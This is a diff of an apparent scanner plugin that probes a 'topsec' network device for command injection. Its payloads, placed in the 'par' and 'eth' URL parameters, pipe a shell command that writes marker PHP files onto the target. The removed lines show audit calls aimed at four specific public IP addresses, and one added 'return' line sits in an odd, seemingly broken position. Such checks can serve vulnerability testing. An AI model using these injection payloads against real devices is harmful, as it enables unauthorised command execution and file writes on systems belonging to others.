@@ -36,8 +36,9 @@ LanID=1' | echo ' testvul' > testc.php | '
     code, head, res, errcode, _ = curl.curl2(target)
     if 'testvul' in res:
         security_hole(target)
+        return arg
 
-        
+
     payload="acc/tools/enable_tool_debug.php?val=0&tool=1&par=172.0.0.1%27%20|%20echo%20testvul%20>%20testa.php%20|%20%27"
     target = arg + payload
     code, head, res, errcode, _ = curl.curl2(target);
@@ -46,8 +47,9 @@ LanID=1' | echo ' testvul' > testc.php | '
     code, head, res, errcode, _ = curl.curl2(target)
     if 'testvul' in res:
         security_hole(target)
+        return arg
 
-        
+
     payload='acc/network/getMacAddr.php?eth=%20|%20echo%20testvul%20>%20testb.php%20|'
     target = arg + payload
     code, head, res, errcode, _ = curl.curl2(target)
@@ -57,9 +59,7 @@ LanID=1' | echo ' testvul' > testc.php | '
     if 'testvul' in res:
         security_hole(target)
 
-if __name__ == '__main__':
+
+        return arg
+if __name__== '__main__':
     from dummy import *
-    audit(assign('topsec', 'http://61.54.222.33:8080/')[1])
-    audit(assign('topsec', 'http://61.148.24.182/')[1])
-    audit(assign('topsec', 'http://218.206.217.19:8080/')[1])
-    audit(assign('topsec', 'http://61.54.222.39:8080/')[1])
